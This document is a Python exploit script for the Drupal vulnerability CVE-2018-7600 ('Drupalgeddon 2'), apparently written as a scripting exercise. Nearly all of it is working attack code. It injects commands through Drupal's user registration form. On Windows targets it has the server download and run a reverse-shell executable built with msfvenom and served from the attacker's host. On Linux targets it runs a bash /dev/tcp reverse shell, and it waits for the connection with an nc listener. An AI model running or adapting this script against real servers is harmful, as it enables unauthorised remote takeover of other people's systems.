#!/usr/bin/python3
#CVE 2018-7600 (Drupalgeddon 2)
#Usage: python3 d2rev.py target lhost windows
#j3ss1: it's not much i know, just practicing some scripting :)

import os
import sys
import requests
import threading
import socket
import time
import os.path
from os import path

#Supply arguments.
target = sys.argv[1]
lhost = sys.argv[2]
os_type = sys.argv[3]

#Define payload/exploit for windows shell.
def shell_win():
    print("[!] Creating Shellcode -> shell.exe [!]")
    os.system("msfvenom -p windows/shell_reverse_tcp lhost=" + lhost +" lport=443 -f exe -e x86/xor_dynamic -o shell.exe >/dev/null 2>&1")

    print("[+] Shellcode Created [+]")
    setup_http()
    print("[!] Sending Payload [!]")
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shell }
    r = requests.post(url, data=payload)
    print("[+] Payload Sent [+]")
    print("ðŸ’€ Spawning Reverse Shell ðŸ’€")
    fire_and_forget_win()
    recv_shell()


#Define payload/exploit for linux shell.
def shell_linux():
    print("[!] Setting Up Parameters [!]")
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shell }
    requests.post(url, data=payload)
def fire_and_forget_linux():
    threading.Thread(target=shell_linux).start()
    recv_shell()


#Setup listener
def recv_shell():
    os.system("nc -lvnp 443")


#Configure http.server background task.
def serve_payload():
    os.system('python3 -m http.server 80 >/dev/null 2>&1')
def setup_http():
    threading.Thread(target=serve_payload).start()


#Define rev_shell task to fire and forget.  
def rev_shell_win():
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    shell2 = '.\shell.exe'
    payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shell2 }
    requests.post(url, data=payload2)
def fire_and_forget_win():
    threading.Thread(target=rev_shell_win).start()

    
#Configure payload based on os_type.
if os_type == 'windows':
    shell = 'powershell IWR -Uri http://{0}/shell.exe -Outfile shell.exe'.format(lhost)
    print("[!] Windows Target Selected [!]")
    shell_win()
else:
    shell = 'bash -i >& /dev/tcp/' + lhost +'/443 0>&1'
    print("[!] Linux Target Selected [!]")
    fire_and_forget_linux()
